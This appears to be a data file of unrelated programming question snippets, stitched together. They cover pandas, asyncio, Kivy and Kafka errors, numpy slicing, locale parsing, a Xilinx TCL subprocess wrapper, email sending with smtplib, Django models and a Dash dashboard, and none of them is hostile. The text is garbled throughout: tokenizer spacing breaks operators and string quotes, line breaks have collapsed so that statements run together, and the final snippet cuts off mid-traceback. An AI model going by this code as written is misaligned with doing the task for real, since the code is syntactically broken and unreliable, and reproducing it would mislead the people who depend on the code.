"class Entry ( ) : # over-simplified but should be enough for the question def __init__ ( self , value ) : self.set ( value ) def set ( self , value ) : self.value=value def add ( self , value ) : self.value += value def sub ( self , value ) : self.value -= value"
"Memberid | Question | Answer 1 Q1 3 1 Q2 2 1 Q3 Test Text 2 Q1 3 2 Q2 2 2 Q3 Test Text Memberid | Question | Numeric Answers | Freetext answers 1 Q1 3 1 Q2 2 1 Q3 Test Text 2 Q1 3 2 Q2 2 2 Q3 Test Text d = { 'Memberid ' : memberid , 'Question ' : title , 'Answer ' : results } df = pd.DataFrame ( d )"
"C : \Program Files ( x86 ) \Python36_64\lib\site-packages\pywinauto\__init__.py:80 : UserWarning : Revert to STA COM threading mode warnings.warn ( `` Revert to STA COM threading mode '' , UserWarning ) [ INFO ] [ GL ] NPOT texture support is available [ INFO ] [ Base ] Start application main loopTraceback ( most recent call last ) : File `` .\application.py '' , line 368 , in < module > Application ( ) .run ( ) File `` C : \Program Files ( x86 ) \Python36_64\lib\site-packages\kivy\app.py '' , line 826 , in run runTouchApp ( ) File `` C : \Program Files ( x86 ) \Python36_64\lib\site-packages\kivy\base.py '' , line 477 , in runTouchApp EventLoop.start ( ) File `` C : \Program Files ( x86 ) \Python36_64\lib\site-packages\kivy\base.py '' , line 164 , in start provider.start ( ) File `` C : \Program Files ( x86 ) \Python36_64\lib\site-packages\kivy\input\providers\wm_touch.py '' , line 68 , in start self.hwnd , GWL_WNDPROC , self.new_windProc ) ctypes.ArgumentError : argument 3 : < class 'TypeError ' > : wrong type if SYSTEM == `` Windows '' : import win32gui import win32process import wmi from pywinauto import application import pywinauto"
"from ldap3 import Server , Connection , ALL , LDAPBindError , SUBTREE , ALL_ATTRIBUTES , MODIFY_REPLACEImportError : can not import name 'LDAPBindError '"
"A [ INFO ] 2019-11-19T15:17:19.603Z < BrokerConnection ... < connecting > [ IPv4 ( '10.0.128.56 ' , 9094 ) ] > : Connection complete.B [ ERROR ] 2019-11-19T15:17:19.605Z < BrokerConnection ... < connected > [ IPv4 ( '10.0.128.56 ' , 9094 ) ] > : socket disconnectedC [ ERROR ] KafkaTimeoutError : KafkaTimeoutError : Failed to update metadata after 60.0 secs . 7|1574772202.379|FEATURE|rdkafka # producer-1| [ thrd : HOSTNAME ] : HOSTNAME:9094/bootstrap : Updated enabled protocol features +ApiVersion to ApiVersion % 7|1574772202.379|STATE|rdkafka # producer-1| [ thrd : HOSTNAME ] : HOSTNAME:9094/bootstrap : Broker changed state CONNECT - > APIVERSION_QUERY % 7|1574772202.379|BROKERFAIL|rdkafka # producer-1| [ thrd : HOSTNAME ] : HOSTNAME:9094/bootstrap : failed : err : Local : Broker transport failure : ( errno : Operation now in progress ) % 7|1574772202.379|FEATURE|rdkafka # producer-1| [ thrd : HOSTNAME ] : HOSTNAME:9094/bootstrap : Updated enabled protocol features -ApiVersion to % 7|1574772202.380|STATE|rdkafka # producer-1| [ thrd : HOSTNAME ] : HOSTNAME:9094/bootstrap : Broker changed state APIVERSION_QUERY - > DOWN"
static async Task DoStuff ( ) { var ioBoundTask = DoIoBoundWorkAsync ( ) ; int cpuBoundResult = DoCpuIntensizeCalc ( ) ; int ioBoundResult = await ioBoundTask.ConfigureAwait ( false ) ; Console.WriteLine ( $ '' The result is { cpuBoundResult + ioBoundResult } '' ) ; } static async Task < int > DoIoBoundWorkAsync ( ) { Console.WriteLine ( `` Make API call ... '' ) ; await Task.Delay ( 2500 ) .ConfigureAwait ( false ) ; // non-blocking async call Console.WriteLine ( `` Data back . `` ) ; return 1 ; } static int DoCpuIntensizeCalc ( ) { Console.WriteLine ( `` Do smart calc ... '' ) ; Thread.Sleep ( 2000 ) ; // blocking call . e.g . a spinning loop Console.WriteLine ( `` Calc finished . `` ) ; return 2 ; } import timeimport asyncioasync def do_stuff ( ) : ioBoundTask = do_iobound_work_async ( ) cpuBoundResult = do_cpu_intensive_calc ( ) ioBoundResult = await ioBoundTask print ( f '' The result is { cpuBoundResult + ioBoundResult } '' ) async def do_iobound_work_async ( ) : print ( `` Make API call ... '' ) await asyncio.sleep ( 2.5 ) # non-blocking async call print ( `` Data back . '' ) return 1def do_cpu_intensive_calc ( ) : print ( `` Do smart calc ... '' ) time.sleep ( 2 ) # blocking call . e.g . a spinning loop print ( `` Calc finished . '' ) return 2await do_stuff ( ) -- - C # -- -Make API call ... Do smart calc ... Calc finished.Data back.The result is 3 -- - Python -- -Do smart calc ... Calc finished.Make API call ... Data back.The result is 3 async def do_stuff ( ) : task = asyncio.create_task ( do_iobound_work_async ( ) ) await asyncio.sleep ( 0 ) # < ~~~~~~~~~ This hacky line sets the task running cpuBoundResult = do_cpu_intensive_calc ( ) ioBoundResult = await task print ( f '' The result is { cpuBoundResult + ioBoundResult } '' )
def get_license ( self ) : # return self.combobox_license.get_active_text ( ) tree_iter = self.combobox_license.get_active_iter ( ) if tree_iter ! = None : model = self.combobox_license.get_model ( ) return model [ tree_iter ] [ 0 ] else : entry = self.combobox_license.get_child ( ) return entry.get_text ( ) < object class= '' GtkComboBox '' id= '' combobox_license '' > < property name= '' visible '' > True < /property > < property name= '' can_focus '' > False < /property > < property name= '' model '' > liststore_license < /property > < property name= '' has_entry '' > True < /property > < property name= '' entry_text_column '' > 0 < /property > < signal name= '' changed '' handler= '' on_combobox_license_changed '' swapped= '' no '' / > < child > < object class= '' GtkCellRendererText '' id= '' cellrenderertext_license '' / > < /child > < child internal-child= '' entry '' > < object class= '' GtkEntry '' id= '' combobox-entry2 '' > < property name= '' can_focus '' > False < /property > < property name= '' buffer '' > entrybuffer1 < /property > < /object > < /child > < /object >
"def distance ( units='m ' ) : my_distance = read_encoder ( ) if units == 'm ' : return my_distance * 1.000 elif units == 'km ' : return my_distance / 1000. elif units == 'cm ' : return my_distance * 10.00 elif units == 'yd ' : return my_distance * 1.094 else : return -1 def distance ( units='m ' ) : multiplier = { 'm ' : 1.000 , 'km ' : 0.001 , 'cm ' : 10.00 'yd ' : 1.094 } try : return read_encoder ( ) * mulitplier [ units ] except KeyError : return -1"
"class TestClass : def sample_method ( self ) : pass def test_method ( self , method_reference ) : print ( method_reference is self.sample_method ) instance = TestClass ( ) instance.test_method ( instance.sample_method ) assert < bound method TestTransformFormatter.transform1 of < matplotlib.tests.test_ticker.TestTransformFormatter object at 0x7f0101077b70 > > is < bound method TestTransformFormatter.transform1 of < matplotlib.tests.test_ticker.TestTransformFormatter object at 0x7f0101077b70 > > E + where < bound method TestTransformFormatter.transform1 of < matplotlib.tests.test_ticker.TestTransformFormatter object at 0x7f0101077b70 > > = < matplotlib.ticker.TransformFormatter object at 0x7f0101077e10 > .transformE + and < bound method TestTransformFormatter.transform1 of < matplotlib.tests.test_ticker.TestTransformFormatter object at 0x7f0101077b70 > > = < matplotlib.tests.test_ticker.TestTransformFormatter object at 0x7f0101077b70 > .transform1"
"import numpy as npx = np.arange ( 20 ) start = np.array ( [ 2 , 8 , 15 ] ) stop = np.array ( [ 5 , 10 , 20 ] ) nsubarray = len ( start ) y = array ( [ 2 , 3 , 4 , 8 , 9 , 15 , 16 , 17 , 18 , 19 ] ) import itertools as ity = [ x [ start [ i ] : stop [ i ] ] for i in range ( nsubarray ) ] y = np.fromiter ( it.chain.from_iterable ( y ) , dtype=int ) y = np.empty ( sum ( stop - start ) , dtype = int ) a = 0for i in range ( nsubarray ) : b = a + stop [ i ] - start [ i ] y [ a : b ] = x [ start [ i ] : stop [ i ] ] a = b import numpy as npimport numpy.random as rdimport itertools as itdef get_chunks ( arr , start , stop ) : rng = stop - start rng = rng [ rng ! =0 ] # Need to add this in case of zero sized ranges np.cumsum ( rng , out=rng ) inds = np.ones ( rng [ -1 ] , dtype=np.int ) inds [ rng [ : -1 ] ] = start [ 1 : ] -stop [ : -1 ] +1 inds [ 0 ] = start [ 0 ] np.cumsum ( inds , out=inds ) return np.take ( arr , inds ) def for_loop ( arr , start , stop ) : y = np.empty ( sum ( stop - start ) , dtype = int ) a = 0 for i in range ( nsubarray ) : b = a + stop [ i ] - start [ i ] y [ a : b ] = arr [ start [ i ] : stop [ i ] ] a = b return yxmax = 1E6nsubarray = 100000x = np.arange ( xmax ) start = rd.randint ( 0 , xmax - 10 , nsubarray ) stop = start + 10 In [ 379 ] : % timeit np.hstack ( [ x [ i : j ] for i , j in it.izip ( start , stop ) ] ) 1 loops , best of 3 : 410 ms per loopIn [ 380 ] : % timeit for_loop ( x , start , stop ) 1 loops , best of 3 : 281 ms per loopIn [ 381 ] : % timeit np.concatenate ( [ x [ i : j ] for i , j in it.izip ( start , stop ) ] ) 10 loops , best of 3 : 97.8 ms per loopIn [ 382 ] : % timeit get_chunks ( x , start , stop ) 100 loops , best of 3 : 16.6 ms per loop"
"deleting this line causes all subheadings to be rendered as h1 tagsI should be an h1=================I should be an h2 -- -- -- -- -- -- -- -- -foo I should also be an h2 -- -- -- -- -- -- -- -- -- -- -- foo from docutils.core import publish_partsparts = publish_parts ( rest_content , writer_name= '' html '' ) html_snippet = parts [ 'html_body ' ]"
"x = `` 1.234.345,00 '' res = float ( x.replace ( ' . ' , `` ) .replace ( ' , ' , ' . ' ) ) print ( res , type ( res ) ) 1234345.0 < class 'float ' > import localeprint ( locale.localeconv ( ) ) { 'int_curr_symbol ' : `` , 'currency_symbol ' : `` , 'mon_decimal_point ' : `` , ... , 'decimal_point ' : ' . ' , 'thousands_sep ' : `` , 'grouping ' : [ ] } mylocale = locale.create_new_locale ( ) # `` blank '' conventions or copied from defaultmylocale.localeconv ( ) [ 'thousands_sep ' ] = ' . 'mylocale.localeconv ( ) [ 'decimal_point ' ] = ' , 'setlocale ( LC_NUMERIC , mylocale ) atof ( '123.456,78 ' ) # 123456.78 import localefrom collections import defaultdictd = defaultdict ( list ) for alias in locale.locale_alias : locale.setlocale ( locale.LC_ALL , alias ) env = locale.localeconv ( ) d [ ( env [ 'thousands_sep ' ] , env [ 'decimal_point ' ] ) ] .append ( alias ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -Error Traceback ( most recent call last ) < ipython-input-164-f8f6a6db7637 > in < module > ( ) 5 6 for alias in locale.locale_alias : -- -- > 7 locale.setlocale ( locale.LC_ALL , alias ) 8 env = locale.localeconv ( ) 9 d [ ( env [ 'thousands_sep ' ] , env [ 'decimal_point ' ] ) ] .append ( alias ) C : \Program Files\Anaconda3\lib\locale.py in setlocale ( category , locale ) 596 # convert to string 597 locale = normalize ( _build_localename ( locale ) ) -- > 598 return _setlocale ( category , locale ) 599 600 def resetlocale ( category=LC_ALL ) : Error : unsupported locale setting"
"> > > ( a , b ) = a [ b ] = { } , 5 > > > a { 5 : ( { ... } , 5 ) } > > > ( a , b ) = a [ b ] = { ' x':1 } , 5 > > > a { 5 : ( { ... } , 5 ) , ' x ' : 1 }"
"x = range ( 3 ) y = range ( 3 ) print id ( x ) , id ( y ) 4366592912 4366591040 id ( range ( 3 ) ) 4366623376 id ( range ( 3 ) ) 4366623376"
"import pandas_ml as pdmldf = pdml.ModelFrame ( { ' A ' : [ 1 , 2 , 3 ] , ' B ' : [ 2 , 3 , 4 ] , ' C ' : [ 3 , 4 , 5 ] } , index= [ ' a ' , ' b ' , ' c ' ] ) df A B Ca 1 2 3b 2 3 4c 3 4 5 x_test = pd.read_csv ( `` x_test.csv '' , sep= ' ; ' , header=None )"
"xx , yy = mgrid [ 0:5 , 0:3 ]"
"% search *.vhdl -type fileD : /git/PoC/src/common/config.vhdlD : /git/PoC/src/common/utils.vhdlD : /git/PoC/src/common/vectors.vhdl ... .press ENTER for the next stepsending 'search *.vhdl -type file'stdoutLine='POC_BOUNDARY'output consumed until boundary string ... . import subprocessclass XilinxTCLShellProcess ( object ) : # executable = `` sortnet_BitonicSort_tb.exe '' executable = r '' C : \Xilinx\14.7\ISE_DS\ISE\bin\nt64\xtclsh.exe '' boundarString = `` POC_BOUNDARY '' boundarCommand = bytearray ( `` puts { 0 } \n '' .format ( boundarString ) , `` ascii '' ) def create ( self , arguments ) : sysargs = [ ] sysargs.append ( self.executable ) self.proc = subprocess.Popen ( sysargs , stdin=subprocess.PIPE , stdout=subprocess.PIPE , stderr=subprocess.STDOUT ) self.sendBoundardCommand ( ) while ( True ) : stdoutLine = self.proc.stdout.readline ( ) .decode ( ) if ( self.boundarString in stdoutLine ) : break print ( `` found boundary string '' ) def terminate ( self ) : self.proc.terminate ( ) def sendBoundardCommand ( self ) : self.proc.stdin.write ( self.boundarCommand ) self.proc.stdin.flush ( ) def sendCommand ( self , line ) : command = bytearray ( `` { 0 } \n '' .format ( line ) , `` ascii '' ) self.proc.stdin.write ( command ) self.sendBoundardCommand ( ) def sendLine ( self , line ) : self.sendCommand ( line ) while ( True ) : stdoutLine = self.proc.stdout.readline ( ) .decode ( ) print ( `` stdoutLine= ' { 0 } ' '' .format ( stdoutLine ) ) if ( stdoutLine == `` '' ) : print ( `` reached EOF in stdout '' ) break elif ( `` vhdl '' in stdoutLine ) : print ( `` found a file name '' ) elif ( self.boundarString in stdoutLine ) : print ( `` output consumed until boundary string '' ) breakdef main ( ) : print ( `` creating 'XilinxTCLShellProcess ' instance '' ) xtcl = XilinxTCLShellProcess ( ) print ( `` launching process '' ) arguments = [ ] xtcl.create ( arguments ) i = 1 while True : print ( `` press ENTER for the next step '' ) from msvcrt import getch from time import sleep sleep ( 0.1 ) # 0.1 seconds key = ord ( getch ( ) ) if key == 27 : # ESC print ( `` aborting '' ) print ( `` sending 'exit ' '' ) xtcl.sendLine ( `` exit '' ) break elif key == 13 : # ENTER if ( i == 1 ) : # print ( `` sending 'project new test.xise ' '' ) # xtcl.sendLine ( `` project new test.xise '' ) print ( `` sending 'project open PoCTest.xise ' '' ) xtcl.sendLine ( `` project open PoCTest.xise '' ) i += 1 elif ( i == 2 ) : print ( `` sending 'lib_vhdl get PoC files ' '' ) xtcl.sendLine ( `` lib_vhdl get PoC files '' ) i += 1 elif ( i == 3 ) : print ( `` sending 'search *.vhdl -type file ' '' ) xtcl.sendLine ( `` search *.vhdl -type file '' ) i += 1 elif ( i == 4 ) : print ( `` sending 'xfile add ../../src/common/strings.vhdl -lib_vhdl PoC -view ALL ' '' ) xtcl.sendLine ( `` xfile add ../../src/common/strings.vhdl -lib_vhdl PoC -view ALL '' ) i += 16 elif ( i == 20 ) : print ( `` sending 'project close ' '' ) xtcl.sendLine ( `` project close '' ) i += 1 elif ( i == 21 ) : print ( `` sending 'exit ' '' ) xtcl.sendCommand ( `` exit '' ) break print ( `` exit main ( ) '' ) xtcl.terminate ( ) print ( `` the end ! `` ) # entry pointif __name__ == `` __main__ '' : main ( )"
"def foo ( s ) : `` '' '' A dummy function foo . For example : > > > a = `` 'This is a test string line 1This is a test string line 2This is a test string line 3 '' ' > > > foo ( a ) This is a test string line 1This is a test string line 2This is a test string line 3 > > > `` '' '' print sif __name__ == '__main__ ' : import doctest doctest.testmod ( ) C : \Python27 > python.exe foo.py**********************************************************************File `` foo.py '' , line 5 , in __main__.fooFailed example : a = `` 'This is a test string line 1Exception raised : Traceback ( most recent call last ) : File `` C : \Python27\lib\doctest.py '' , line 1254 , in __run compileflags , 1 ) in test.globs File `` < doctest __main__.foo [ 0 ] > '' , line 1 a = `` 'This is a test string line 1 ^ SyntaxError : EOF while scanning triple-quoted string literal**********************************************************************File `` foo.py '' , line 8 , in __main__.fooFailed example : foo ( a ) Exception raised : Traceback ( most recent call last ) : File `` C : \Python27\lib\doctest.py '' , line 1254 , in __run compileflags , 1 ) in test.globs File `` < doctest __main__.foo [ 1 ] > '' , line 1 , in < module > foo ( a ) NameError : name ' a ' is not defined**********************************************************************1 items had failures : 2 of 2 in __main__.foo***Test Failed*** 2 failures ."
"fp = open ( attachment , 'rb ' ) img = MIMEImage ( fp.read ( ) ) fp.close ( ) img.add_header ( 'Content-ID ' , ' < { } > '.format ( attachment ) ) msg.attach ( img ) fp = open ( att1 , ' r ' ) img = MIMEText ( fp.read ( ) , 'html ' ) fp.close ( ) img.add_header ( 'Content-ID ' , ' < att1 > ' ) msg.attach ( img ) df = dFrame ( q2 ) tbl = ' { df } 'tbl = df.to_html ( index=False , justify='center ' ) msgText = MIMEText ( ' < b > % s < /b > < br > < html src= '' cid : % s '' > < br > ' % ( body , tbl ) , 'html ' ) msg.attach ( msgText ) def sndFile1 ( ) : import smtplib from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText from email.mime.image import MIMEImage att1 = path + 'df.html ' att2 = path + 'Indices.png ' att3 = path + 'Segments.png ' subject = 'Market Update ' body = 'This Weeks Report ' msg = MIMEMultipart ( ) msg [ `` To '' ] = myEml msg [ `` From '' ] = myEml msg [ `` Subject '' ] = subject msgText = MIMEText ( ' < b > % s < /b > < br > < html src= '' cid : % s '' > < img src= '' cid : % s '' > < img src= '' cid : % s '' > < br > ' % ( body , att1 , att2 , att3 ) , 'html ' ) msg.attach ( msgText ) fp = open ( att1 , ' r ' ) img = MIMEText ( fp.read ( ) , 'html ' ) fp.close ( ) img.add_header ( 'Content-ID ' , ' < att1 > ' ) msg.attach ( img ) fp = open ( att2 , 'rb ' ) img = MIMEImage ( fp.read ( ) ) fp.close ( ) img.add_header ( 'Content-ID ' , ' < { } > '.format ( att2 ) ) msg.attach ( img ) fp = open ( att3 , 'rb ' ) img = MIMEImage ( fp.read ( ) ) fp.close ( ) img.add_header ( 'Content-ID ' , ' < { } > '.format ( att3 ) ) msg.attach ( img ) s = smtplib.SMTP_SSL ( mySMTP , smtpPORT ) s.login ( myUID , myPASS ) s.sendmail ( myEml , myRec , msg.as_string ( ) ) def sndFile1 ( ) : import smtplib from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText from email.mime.image import MIMEImage att1 = path + 'df.html ' att2 = path + 'Indices.png ' att3 = path + 'Segments.png ' subject = 'Market Update ' body = 'This Weeks Report ' msg = MIMEMultipart ( ) msg [ `` To '' ] = myEml msg [ `` From '' ] = myEml msg [ `` Subject '' ] = subject fp = open ( att1 , ' r ' ) html = fp.read ( ) fp.close ( ) msgText = MIMEText ( ' < b > % s < /b > < br > < % s > < br > < img src= '' cid : % s '' > < br > < img src= '' cid : % s '' > < br > ' % ( body , html , att2 , att3 ) , 'html ' ) msg.attach ( msgText ) with open ( att2 , 'rb ' ) as fp : img = MIMEImage ( fp.read ( ) ) img.add_header ( 'Content-ID ' , ' < { } > '.format ( att2 ) ) msg.attach ( img ) with open ( att3 , 'rb ' ) as fp : img = MIMEImage ( fp.read ( ) ) img.add_header ( 'Content-ID ' , ' < { } > '.format ( att3 ) ) msg.attach ( img ) s = smtplib.SMTP_SSL ( mySMTP , smtpPORT ) s.login ( myUID , myPASS ) s.sendmail ( myEml , myRec , msg.as_string ( ) ) s.quit ( )"
"import refrom django.db import modelsclass TopicGroup ( models.Model ) : title = models.CharField ( max_length=500 , unique='True ' ) def __unicode__ ( self ) : return re.sub ( r'^ ( . { 75 } ) . * $ ' , '\g < 1 > ... ' , self.title ) class Meta : ordering = [ 'title ' ] class Supervisor ( models.Model ) : name = models.CharField ( max_length=100 ) neptun_code = models.CharField ( max_length=6 ) max_student = models.IntegerField ( ) topicgroups = models.ManyToManyField ( TopicGroup , blank=True , null=True ) def __unicode__ ( self ) : return u ' % s ( % s ) ' % ( self.name , self.neptun_code ) class Meta : ordering = [ 'name ' ] unique_together = ( 'name ' , 'neptun_code ' ) class Topic ( models.Model ) : title = models.CharField ( max_length=500 , unique='True ' ) foreign_lang_requirements = models.CharField ( max_length=500 , blank=True ) note = models.CharField ( max_length=500 , blank=True ) supervisor_topicgroup = models.ForeignKey ( ? ? ? , blank=True , null=True ) def __unicode__ ( self ) : return u ' % s -- - % s ' % ( self.supervisor_topicgroup , re.sub ( r'^ ( . { 75 } ) . * $ ' , '\g < 1 > ... ' , self.title ) ) class Meta : ordering = [ 'supervisor_topicgroup ' , 'title ' ]"
"/usr/local/lib/python3.8/multiprocessing/resource_tracker.py:216 : UserWarning : resource_tracker : There appear to be 10 leaked shared_memory objects to clean up at shutdown warnings.warn ( 'resource_tracker : There appear to be % d '/usr/local/lib/python3.8/multiprocessing/resource_tracker.py:229 : UserWarning : resource_tracker : '/psm_e27e5f9e ' : [ Errno 2 ] No such file or directory : '/psm_e27e5f9e ' warnings.warn ( 'resource_tracker : % r : % s ' % ( name , e ) ) /usr/local/lib/python3.8/multiprocessing/resource_tracker.py:229 : UserWarning : resource_tracker : '/psm_2cf099ac ' : [ Errno 2 ] No such file or directory : '/psm_2cf099ac ' < 8 more similar messages omitted > import multiprocessingimport multiprocessing.shared_memory as shared_memorydef create_shm ( ) : shm = shared_memory.SharedMemory ( create=True , size=30000000 ) shm.close ( ) return shm.namedef main ( ) : pool = multiprocessing.Pool ( processes=4 ) tasks = [ pool.apply_async ( create_shm ) for _ in range ( 200 ) ] for task in tasks : name = task.get ( ) print ( 'Getting { } '.format ( name ) ) shm = shared_memory.SharedMemory ( name=name , create=False ) shm.close ( ) shm.unlink ( ) pool.terminate ( ) pool.join ( ) if __name__ == '__main__ ' : main ( )"
.. toctree : : intro Will be skipped===============Where is my parent section ? -- -- -- -- -- -- -- -- -- -- -- -- -- -Second section==============
"body = `` '' '' This is the body of the document , with a set of words '' '' '' my_document = search.Document ( fields= [ search.TextField ( name='title ' , value= ' A Set Of Words ' ) , search.TextField ( name='body ' , value=body ) , ] ) documents = [ dict ( title= '' Alpha '' , body= '' A '' ) , # `` Alpha '' dict ( title= '' Beta '' , body= '' B Two '' ) , # `` Beta '' dict ( title= '' Alpha Two '' , body= '' A '' ) , # `` Alpha2 '' ] for doc in documents : search.Document ( fields= [ search.TextField ( name= '' title '' , value=doc.title ) , search.TextField ( name= '' body '' , value=doc.body ) , ] ) index.put ( doc ) # for some search.Index # Then when we search , we search the Title and Body.index.search ( `` Alpha '' ) # returns [ Alpha , Alpha2 ] # Results where the search is found in the Title are given higher weight.index.search ( `` Two '' ) # returns [ Alpha2 , Beta ] -- note Alpha2 has 'Two ' in the title ."
"import dask.dataframe as ddimport pandas as pddf = pd.DataFrame ( { ' A ' : [ 1,2,3 ] , ' B ' : [ 2,3,4 ] } ) ddf = dd.from_pandas ( df , npartitions = 3 ) print ( ddf.head ( ) ) A B0 1 2 A B0 1 21 2 32 3 4"
"Readline internal errorTraceback ( most recent call last ) : File `` C : \ ... \anaconda3\lib\site-packages\pyreadline\console\console.py '' , line 768 , in hook_wrapper_23 res = ensure_str ( readline_hook ( prompt ) ) File `` C : \ ... \anaconda3\lib\site-packages\pyreadline\rlmain.py '' , line 571 , in readline self._readline_from_keyboard ( ) File `` C : \ ... \anaconda3\lib\site-packages\pyreadline\rlmain.py '' , line 536 , in _readline_from_keyboard if self._readline_from_keyboard_poll ( ) : File `` C : \ ... \anaconda3\lib\site-packages\pyreadline\rlmain.py '' , line 556 , in _readline_from_keyboard_poll result = self.mode.process_keyevent ( event.keyinfo ) File `` C : \ ... \anaconda3\lib\site-packages\pyreadline\modes\emacs.py '' , line 243 , in process_keyevent r = self.process_keyevent_queue [ -1 ] ( keyinfo ) File `` C : \ ... \anaconda3\lib\site-packages\pyreadline\modes\emacs.py '' , line 286 , in _process_keyevent r = dispatch_func ( keyinfo ) File `` C : \ ... \anaconda3\lib\site-packages\pyreadline\modes\basemode.py '' , line 257 , in complete completions = self._get_completions ( ) File `` C : \ ... \anaconda3\lib\site-packages\pyreadline\modes\basemode.py '' , line 200 , in _get_completions r = self.completer ( ensure_unicode ( text ) , i ) File `` C : \ ... \anaconda3\lib\rlcompleter.py '' , line 80 , in complete readline.redisplay ( ) AttributeError : module 'readline ' has no attribute 'redisplay ' Can not uninstall 'pyreadline ' . It is a distutils installed project and thus we can not accurately determine which files belong to it which would lead to only a partial uninstall ."
"import pandas as pdimport networkx as nxdf = pd.DataFrame ( { 'source ' : ( ' a ' , ' a ' , ' a ' , ' b ' , ' c ' , 'd ' ) , 'target ' : ( ' b ' , ' b ' , ' c ' , ' a ' , 'd ' , ' a ' ) , 'weight ' : ( 1,2,3,4,5,6 ) } ) G=nx.from_pandas_dataframe ( df , 'source ' , 'target ' , [ 'weight ' ] ) G.edges ( data = True ) [ ( 'd ' , ' a ' , { 'weight ' : 6 } ) , ( 'd ' , ' c ' , { 'weight ' : 5 } ) , ( ' c ' , ' a ' , { 'weight ' : 3 } ) , ( ' a ' , ' b ' , { 'weight ' : 4 } ) ] G.is_directed ( ) , G.is_multigraph ( ) ( False , False ) [ ( 'd ' , ' a ' , { 'weight ' : 6 } ) , ( ' c ' , 'd ' , { 'weight ' : 5 } ) , ( ' a ' , ' c ' , { 'weight ' : 3 } ) , ( ' b ' , ' a ' , { 'weight ' : 4 } ) , ( ' a ' , ' b ' , { 'weight ' : 2 } ) , ( ' a ' , ' b ' , { 'weight ' : 4 } ) ]"
"SELECT [ Date ] , [ eNodeBName ] , [ Downlinkbandwidth ] , [ DownlinkEARFCN ] , [ CellName ] , [ LocalCellId ] , [ PhysicalcellID ] , [ LRRCConnReqAtt ] , [ RRCSetupSuccessRate ] , [ InterFreqSuccessRate4G ] , [ IntraRATHOSucccessRate ] , [ IntraFreqSuccessRate4G ] , [ CellDLMaxThroughputMbps ] , [ CellDownlinkAverageThroughputMbps ] FROM [ myDB ] . [ dbo ] . [ input ] SELECT [ Date ] , [ CellName ] , [ LRRCConnReqAtt ] , [ RRCSetupSuccessRate ] , [ InterFreqSuccessRate4G ] , [ IntraRATHOSucccessRate ] , [ IntraFreqSuccessRate4G ] , [ CellDLMaxThroughputMbps ] , [ CellDownlinkAverageThroughputMbps ] FROM [ myDB ] . [ dbo ] . [ input ] SELECT [ LRRCConnReqAtt ] , [ RRCSetupSuccessRate ] , [ InterFreqSuccessRate4G ] , [ IntraRATHOSucccessRate ] , [ IntraFreqSuccessRate4G ] , [ CellDLMaxThroughputMbps ] , [ CellDownlinkAverageThroughputMbps ] FROM [ myDB ] . [ dbo ] . [ input ] import dashimport dash_core_components as dccimport dash_html_components as htmlimport pandas as pdfrom sqlalchemy import create_engineimport datetimefrom datetime import datetime as dtfrom dash.dependencies import Input , Output # connect dbengine = create_engine ( 'mssql+pyodbc : //xxxxxx\SMxxxxxARTRNO_EXPRESS/myDB ? driver=SQL+Server+Native+Client+11.0 ' ) cursor = engine.raw_connection ( ) .cursor ( ) start = datetime.datetime ( 2019 , 12 , 2 ) end = datetime.datetime ( 2019 , 12 , 15 ) external_stylesheets = [ 'https : //codepen.io/chriddyp/pen/bWLwgP.css ' ] app = dash.Dash ( __name__ , external_stylesheets=external_stylesheets ) lte_kpis = pd.read_sql ( 'SELECT * FROM [ myDB ] . [ dbo ] . [ input ] ' , engine ) lte_kpis_raw = pd.read_sql ( 'SELECT LRRCConnReqAtt , RRCSetupSuccessRate , InterFreqSuccessRate4G , IntraRATHOSucccessRate , IntraFreqSuccessRate4G , CellDLMaxThroughputMbps , CellDownlinkAverageThroughputMbps FROM [ myDB ] . [ dbo ] . [ input ] ' , engine ) scale_1 = [ 'LRRCConnReqAtt ' ] scale_2 = [ 'RRCSetupSuccessRate ' , 'InterFreqSuccessRate4G ' , 'IntraRATHOSucccessRate ' , 'IntraFreqSuccessRate4G ' ] scale_3 = [ 'CellDLMaxThroughputMbps ' , 'CellDownlinkAverageThroughputMbps ' ] pd.set_option ( 'display.max_columns ' , 500 ) pd.set_option ( 'display.width ' , 1000 ) availble_cell = lte_kpis [ 'CellName ' ] .unique ( ) # availble_cell = lte_kpis.unique ( lte_kpis [ [ 'Date ' , 'Site Name ' , 'Cell CI ' , 'Cell LAC ' ] ] .values.ravel ( ' K ' ) ) app.layout = html.Div ( [ dcc.Dropdown ( id='cell-name-xaxis-column ' , options= [ { 'label ' : i , 'value ' : i } for i in availble_cell ] , value='2205516 ' ) , dcc.Dropdown ( id='myColumns ' , options= [ { 'label ' : col , 'value ' : col } for col in lte_kpis_raw.columns ] , multi=True , value='LRRCConnReqAtt ' ) , dcc.DatePickerRange ( id='my-date-picker-range ' , min_date_allowed=dt ( 1995 , 8 , 5 ) , max_date_allowed=dt ( 2030 , 9 , 19 ) , initial_visible_month=dt ( 2019 , 10 , 5 ) , start_date=dt ( 2019 , 10 , 1 ) , end_date=dt ( 2020 , 1 , 1 ) ) , html.Div ( id='output-container-date-picker-range ' ) , dcc.Graph ( style= { 'height ' : 300 } , id='my-graph ' ) ] ) @ app.callback ( Output ( 'my-graph ' , 'figure ' ) , [ Input ( 'cell-name-xaxis-column ' , 'value ' ) , Input ( 'myColumns ' , 'value ' ) ] ) def update_graph ( xaxis_column_name , yaxis_column_name , date_value ) : dff = lte_kpis [ lte_kpis [ 'Date ' ] == date_value ] return { 'data ' : [ dict ( x=dff [ dff [ 'Date ' ] == xaxis_column_name ] [ 'Value ' ] , y=dff [ dff [ 'Date ' ] == yaxis_column_name ] [ 'Value ' ] , text=dff [ dff [ 'Date ' ] == yaxis_column_name ] [ 'CellName ' ] , mode='line ' , line= { 'size ' : 15 , 'opacity ' : 0.5 } ) ] , } if __name__ == '__main__ ' : app.run_server ( debug=True ) scale_1 = [ 'LRRCConnReqAtt ' ] scale_2 = [ 'RRCSetupSuccessRate ' , 'InterFreqSuccessRate4G ' , 'IntraRATHOSucccessRate ' , 'IntraFreqSuccessRate4G ' ] scale_3 = [ 'CellDLMaxThroughputMbps ' , 'CellDownlinkAverageThroughputMbps ' ] TypeError : update_graph ( ) missing 1 required positional argument : 'date_value'Traceback ( most recent call last ) File `` C : \Users\mwx825326\PycharmProjects\MyReference\venv\Lib\site-packages\dash\dash.py '' , line 1337 , in add_contextoutput_value = func ( *args , **kwargs ) # % % callback invoked % % TypeError : update_graph ( ) missing 1 required positional argument : 'date_value'Traceback ( most recent call last ) : File `` C : 